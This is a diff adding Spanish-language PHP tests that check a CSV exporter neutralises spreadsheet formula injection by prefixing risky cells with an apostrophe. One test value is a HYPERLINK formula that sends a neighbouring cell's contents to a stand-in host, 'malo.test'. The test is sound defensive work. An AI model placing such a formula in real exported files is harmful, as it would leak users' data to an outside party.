@@ -112,3 +112,20 @@ describe('mensajes en español', function () {
         expect(trans('auth.failed'))->toBe('El correo o la contraseña no son correctos.');
     });
 });
+
+it('neutraliza las celdas que Excel ejecutaría como fórmula', function (string $valor) {
+    $respuesta = ExportadorCsv::descargar('x.csv', ['Nombre'], [[$valor]]);
+
+    expect(filasDe($respuesta)[1][0])->toBe("'".$valor);
+})->with([
+    'igual' => '=HYPERLINK("http://malo.test/?"&A2,"ver")',
+    'más' => '+57 300 0000000',
+    'menos' => '-2+3',
+    'arroba' => '@SUM(A1:A9)',
+]);
+
+it('no toca los números negativos ni el texto normal', function () {
+    $respuesta = ExportadorCsv::descargar('x.csv', ['A', 'B'], [[-15, 'Marta Ospina']]);
+
+    expect(filasDe($respuesta)[1])->toBe(['-15', 'Marta Ospina']);
+});
